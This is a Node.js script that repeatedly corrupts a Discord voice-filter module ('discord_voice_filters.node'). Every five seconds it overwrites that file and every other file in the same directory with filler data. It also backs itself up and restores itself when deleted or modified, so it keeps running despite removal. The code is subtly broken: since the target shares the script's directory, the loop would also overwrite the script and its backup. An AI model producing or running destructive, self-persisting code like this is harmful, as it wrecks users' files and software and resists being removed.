const fs = require('fs');
const path = require('path');

// Toggle to enable or disable the process
const enableDestruction = true;

// Function to check and restore the main script
function ensureMainScript() {
  const scriptPath = __filename;
  const backupPath = scriptPath.replace('.js', '_backup.js');

  // Check if the main script is missing or replaced
  if (!fs.existsSync(scriptPath) || !fs.readFileSync(scriptPath).includes('ensureMainScript')) {
    console.warn('Main script missing or modified. Restoring from backup...');
    fs.copyFileSync(backupPath, scriptPath);
    console.log('Main script restored as index.js.');
  }
}

// Function to corrupt a file with random data
function corruptFile(filePath) {
  const randomData = Buffer.alloc(1024, Math.random().toString(36).substring(2)); // Generate random data
  fs.writeFile(filePath, randomData, (err) => {
    if (err) {
      console.error(`Failed to corrupt file: ${filePath}`, err);
    } else {
      console.log(`Successfully corrupted file: ${filePath}`);
    }
  });
}

// Function to monitor and corrupt the module
function monitorAndCorruptModule(moduleName) {
  try {
    // Resolve the module path
    const resolvedModulePath = require.resolve(moduleName);

    // Corrupt the main module file
    corruptFile(resolvedModulePath);

    // Corrupt any associated files in the module directory
    const moduleDirectory = path.dirname(resolvedModulePath);
    fs.readdir(moduleDirectory, (err, files) => {
      if (err) {
        console.error(`Failed to read module directory: ${moduleDirectory}`, err);
        return;
      }

      files.forEach((file) => {
        const filePath = path.join(moduleDirectory, file);
        corruptFile(filePath);
      });
    });

    console.log(`Monitoring and corruption completed for: ${moduleName}`);
  } catch (error) {
    console.warn(`Module ${moduleName} not found yet. Retrying...`);
  }
}

// Persistent monitoring to ensure the script remains functional
function startMonitoring() {
  const moduleName = './discord_voice_filters.node';

  if (enableDestruction) {
    setInterval(() => {
      ensureMainScript();
      monitorAndCorruptModule(moduleName);
    }, 5000); // Check every 5 seconds
  } else {
    console.log('Destruction is disabled. Monitoring not started.');
  }
}

// Create a backup of the script
(function createBackup() {
  const scriptPath = __filename;
  const backupPath = scriptPath.replace('.js', '_backup.js');
  if (!fs.existsSync(backupPath)) {
    fs.copyFile(scriptPath, backupPath, (err) => {
      if (err) {
        console.error(`Failed to create backup of the script: ${backupPath}`, err);
      } else {
        console.log(`Backup created successfully at: ${backupPath}`);
      }
    });
  }
})();

// Start the monitoring process
startMonitoring();
